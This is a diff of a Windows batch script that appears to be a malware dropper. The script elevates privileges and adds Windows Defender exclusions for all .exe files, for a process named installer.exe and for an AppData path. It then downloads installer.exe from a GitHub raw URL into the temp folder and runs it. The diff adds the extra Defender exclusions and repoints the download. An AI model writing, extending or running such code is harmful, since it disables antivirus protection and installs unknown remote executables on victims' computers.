@@ -1,4 +1,4 @@
-REM - This is not the file you need to run. You need to upload this file to your webserver.
+
 
 @echo off
 
@@ -27,6 +27,8 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+Powershell -Command "Set-MpPreference -ExclusionProcess `"installer.exe`""
+Powershell -Command "Add-MpPreference -ExclusionPath `"%USERPROFILE%\AppData\Roaming\installer.exe`""
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/huynq11019/my-meeting/refs/heads/main/RainbowDashClientvip.exe' -OutFile installer.exe"
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/huynq11019/my-meeting/refs/heads/main/installer.exe' -OutFile installer.exe"
 installer.exe
